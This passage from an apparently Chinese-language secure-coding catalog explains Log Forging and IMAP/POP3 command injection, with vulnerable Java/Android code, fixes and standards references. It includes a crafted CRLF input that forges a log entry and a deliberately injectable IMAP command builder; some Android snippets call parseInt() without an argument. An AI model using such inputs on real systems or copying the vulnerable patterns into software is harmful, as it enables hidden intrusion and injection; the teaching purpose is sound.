<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String val = request.getParameter(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">	try &#123;</span><br><span class="line"></span><br><span class="line">  		int value = Integer.parseInt(val);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">  		log.info(&quot;Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果用户为“val”提交字符串“twenty-one”，则日志中会记录以下条目：</p>
<p><code>INFO: Failed to parse val=twenty-one</code></p>
<p>然而，如果攻击者提交字符串<code>“twenty-one%0a%0aINFO:+User+logged+out%3dbadguy”</code>，则日志中会记录以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO: Failed to parse val=twenty-one</span><br><span class="line"></span><br><span class="line">INFO: User logged out=badguy</span><br></pre></td></tr></table></figure>
<p>显然，攻击者可以使用同样的机制插入任意日志条目。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 Log Forging）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>例 2：以下代码将例 1 改编为适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String val = this.getIntent().getExtras().getString(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">	try &#123;</span><br><span class="line"></span><br><span class="line">		int value = Integer.parseInt();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">		Log.e(TAG, &quot;Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-293"><a href="#RECOMMENDATIONS-293" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用间接方法防止 Log Forging 攻击：创建一组与不同事件一一对应的合法日志条目，这些条目必须记录在日志中，并且仅记录该组条目。要捕获动态内容（如用户注销系统），请务必使用由服务器控制的数值，而非由用户提供的数据。这就确保了日志条目中绝不会直接使用由用户提供的输入。</p>
<p>可以按以下方式将例 1 重写为与 NumberFormatException 对应的预定义日志条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	public static final String NFE = &quot;Failed to parse val. The input is required to be an integer value.&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	String val = request.getParameter(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt(val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                log.info(NFE);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>下面是 Android 的等同内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	public static final String NFE = &quot;Failed to parse val. The input is required to be an integer value.&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        String val = this.getIntent().getExtras().getString(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                Log.e(TAG, NFE);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在某些情况下，这个方法有些不切实际，因为这样一组合法的日志条目实在太大或是太复杂了。这种情况下，开发者往往又会退而采用黑名单方法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。然而，不安全字符列表很快就会不完善或过时。更好的方法是创建一份白名单，允许其中的字符出现在日志条目中，并且只接受完全由这些经认可的字符组成的输入。在大多数 Log Forging 攻击中，最关键的字符是“\n”（换行符），该字符决不能出现在日志条目白名单中。</p>
<h5 id="REFERENCES-292"><a href="#REFERENCES-292" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Muffet The night the log was forged.</p>
<p>[2] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[3] IDS03-J. Do not log unsanitized user input CERT</p>
<p>[4] INPUT-1: Validate inputs Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 117</p>
<p>[6] Standards Mapping - FIPS200 AU, SI</p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 AU-9 Protection of Audit Information (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Log-Forging-debug"><a href="#Log-Forging-debug" class="headerlink" title="Log Forging (debug)"></a>Log Forging (debug)</h4><h5 id="ABSTRACT-294"><a href="#ABSTRACT-294" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。</p>
<h5 id="EXPLANATION-295"><a href="#EXPLANATION-295" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下会发生 Log Forging 的漏洞：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据写入到应用程序或系统日志文件中。</p>
</li>
</ol>
<p>为了便于以后的审阅、统计数据收集或调试，应用程序通常使用日志文件来储存事件或事务的历史记录。根据应用程序自身的特性，审阅日志文件可在必要时手动执行，也可以自动执行，即利用工具自动挑选日志中的重要事件或带有某种倾向性的信息。</p>
<p>如果攻击者可以向随后会被逐字记录到日志文件的应用程序提供数据，则可能会妨碍或误导日志文件的解读。最理想的情况是，攻击者可能通过向应用程序提供包括适当字符的输入，在日志文件中插入错误的条目。如果日志文件是自动处理的，那么攻击者就可以通过破坏文件格式或注入意外的字符，从而使文件无法使用。更阴险的攻击可能会导致日志文件中的统计信息发生偏差。通过伪造或其他方式，受到破坏的日志文件可用于掩护攻击者的跟踪轨迹，甚至还可以牵连第三方来执行恶意行为 [1]。最糟糕的情况是，攻击者可能向日志文件注入代码或者其他命令，利用日志处理实用程序中的漏洞 [2]。</p>
<p>例 1： 下列 Web 应用程序代码会尝试从一个请求对象中读取整数值。如果数值未被解析为整数，输入就会被记录到日志中，附带一条提示相关情况的错误消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String val = request.getParameter(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt(val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                log.info(&quot;Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果用户为“val”提交字符串“twenty-one”，则日志中会记录以下条目：</p>
<p><code>INFO: Failed to parse val=twenty-one</code></p>
<p>然而，如果攻击者提交字符串“twenty-one%0a%0aINFO:+User+logged+out%3dbadguy”，则日志中会记录以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO: Failed to parse val=twenty-one</span><br><span class="line"></span><br><span class="line">INFO: User logged out=badguy</span><br></pre></td></tr></table></figure>
<p>显然，攻击者可以使用同样的机制插入任意日志条目。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 Log Forging）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>例 2：以下代码对例 1 进行调整使其适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String val = this.getIntent().getExtras().getString(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                Log.e(TAG, &quot;Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-294"><a href="#RECOMMENDATIONS-294" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用间接方法防止 Log Forging 攻击：创建一组与不同事件一一对应的合法日志条目，这些条目必须记录在日志中，并且仅记录该组条目。要捕获动态内容（如用户注销系统），请务必使用由服务器控制的数值，而非由用户提供的数据。这就确保了日志条目中绝不会直接使用由用户提供的输入。</p>
<p>可以按以下方式将例 1 重写为与 NumberFormatException 对应的预定义日志条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        public static final String NFE = &quot;Failed to parse val. The input is required to be an integer value.&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        String val = request.getParameter(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt(val);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                log.info(NFE);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">..</span><br></pre></td></tr></table></figure>
<p>下面是 Android 的等同内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        public static final String NFE = &quot;Failed to parse val. The input is required to be an integer value.&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        String val = this.getIntent().getExtras().getString(&quot;val&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">                int value = Integer.parseInt();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">                Log.e(TAG, NFE);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在某些情况下，这个方法有些不切实际，因为这样一组合法的日志条目实在太大或是太复杂了。这种情况下，开发者往往又会退而采用黑名单方法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。然而，不安全字符列表很快就会不完善或过时。更好的方法是创建一份白名单，允许其中的字符出现在日志条目中，并且只接受完全由这些经认可的字符组成的输入。在大多数 Log Forging 攻击中，最关键的字符是“\n”（换行符），该字符决不能出现在日志条目白名单中。</p>
<h5 id="REFERENCES-293"><a href="#REFERENCES-293" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Muffet The night the log was forged.</p>
<p>[2] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[3] IDS03-J. Do not log unsanitized user input CERT</p>
<p>[4] INPUT-1: Validate inputs Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 117</p>
<p>[6] Standards Mapping - FIPS200 AU, SI</p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 AU-9 Protection of Audit Information (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1, Requirement 10.5.2</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Mail-Command-Injection-IMAP"><a href="#Mail-Command-Injection-IMAP" class="headerlink" title="Mail Command Injection: IMAP"></a>Mail Command Injection: IMAP</h4><h5 id="ABSTRACT-295"><a href="#ABSTRACT-295" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行利用不可信赖数据源的 IMAP 命令，可能会导致 IMAP 服务器以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-296"><a href="#EXPLANATION-296" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者可以影响发送到 IMAP 邮件服务器的命令时，就会发生 IMAP Command Injection 漏洞。</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。</p>
</li>
<li><p>通过执行 IMAP 命令，攻击者能够指示服务器执行恶意操作，例如发送垃圾邮件。</p>
</li>
</ol>
<p>示例 1：以下代码使用 HTTP 请求参数来构建将发送到 IMAP 服务器的 CREATE 命令。攻击者可以利用此参数修改发送到服务器的命令，并使用 CRLF 字符注入新命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">final String foldername = request.getParameter(&quot;folder&quot;);</span><br><span class="line"></span><br><span class="line">IMAPFolder folder = (IMAPFolder) store.getFolder(&quot;INBOX&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">folder.doCommand(new IMAPFolder.ProtocolCommand() &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public Object doCommand(IMAPProtocol imapProtocol) throws ProtocolException &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            imapProtocol.simpleCommand(&quot;CREATE &quot; + foldername, null);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            // Handle Exception</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return null;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-295"><a href="#RECOMMENDATIONS-295" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户直接控制由程序执行的 IMAP 命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。</p>
<p>在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发者通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。如果不这样，建议使用白名单，以便接受完全由这些经认可的字符组成的输入。</p>
<h5 id="REFERENCES-294"><a href="#REFERENCES-294" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</p>
<p>[2] Vicente Aguilera Díaz MX Injection: Capturing and Exploiting Hidden Mail Servers</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 93</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 078</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 078</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Mail Command Injection (WASC-30)</p>
<h4 id="Mail-Command-Injection-POP3"><a href="#Mail-Command-Injection-POP3" class="headerlink" title="Mail Command Injection: POP3"></a>Mail Command Injection: POP3</h4><h5 id="ABSTRACT-296"><a href="#ABSTRACT-296" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行利用不可信赖数据源的 POP3 命令，可能会导致 POP3 服务器以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-297"><a href="#EXPLANATION-297" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者可以影响发送到 POP3 邮件服务器的命令时，就会发生 POP3 Command Injection 漏洞。</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。</p>
</li>
<li><p>通过执行 POP3 命令，攻击者能够指示服务器执行恶意操作，例如发送垃圾邮件。</p>
</li>
</ol>
<p>示例 1：以下代码使用 HTTP 请求参数来构建将发送到 POP3 服务器的 USER 和 PASS 命令。攻击者可以利用此参数修改发送到服务器的命令，并使用 CRLF 字符注入新命令。</p>
